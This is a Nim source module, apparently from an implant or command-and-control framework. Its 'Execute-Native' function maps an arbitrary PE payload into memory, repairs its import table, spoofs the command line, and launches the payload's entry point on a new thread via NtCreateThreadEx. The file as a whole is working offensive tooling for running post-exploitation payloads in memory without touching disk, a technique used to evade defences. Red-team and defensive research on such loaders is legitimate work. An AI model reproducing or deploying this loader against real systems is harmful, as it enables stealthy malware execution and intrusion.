import ../utils/utils
import ../utils/winapi_wrapper
import ../utils/peloader
import ../rth
import winim/lean
import strformat
import strutils
import ../utils/timeline


#[
  The main execution function
]#
proc execute*(payload: var Payload): bool =

  # Timeline Logging
  logExecToTimeline(payload, "Execute-Native")

  # Map the PE to memory
  var baseAddr = mapPEToMemory(payload.bytes)

  let commandline = payload.arguments.join(" ")

  # if there is a commandline that is set
  if commandline != "":
    setCommandline(commandline)
    DBG(fmt"Commandline: {commandline}")


  if baseAddr == 0:
    DBG("[-] Failed to map PE to memory")
    return false

  DBG("[+] Successfully mapped PE to memory, fixing IAT")

  discard fixIAT(cast[PVOID](baseAddr))

  DBG(fmt"[+] PE Mapped @ {baseAddr:#X}")

  var nt = parsePE(cast[pointer](baseAddr))
  var preferredAddr = cast[LPVOID](nt.OptionalHeader.ImageBase)

  var entry: HANDLE = cast[HANDLE](baseAddr) + cast[HANDLE](nt.OptionalHeader.AddressOfEntryPoint)


  DBG(fmt"Binary was mapped @ {cast[uint64](baseAddr):#X}")
  DBG(fmt"Preferred Mapping @ {cast[uint64](preferredAddr):#X}")

  DBG(fmt"Entry point is at: {cast[uint64](entry):#X}")



  var hThread: HANDLE
  let procHandle: HANDLE = -1
  var status = wNtCreateThreadEx(addr hThread,
                          MAXIMUM_ALLOWED,
                          cast[LPVOID](0),
                          procHandle,
                          cast[LPTHREAD_START_ROUTINE](entry),
                          cast[LPVOID](0), false, 0, 0, 0, cast[LPVOID](0))


  if status == STATUS_SUCCESS:
    DBG("[+] New Thread spawned successfully")
  else:
    DBG("[-] Failed to start new thread")
    return false


  # Wait for the Thread to finish
  WaitForSingleObject(hThread, INFINITE)

  return true
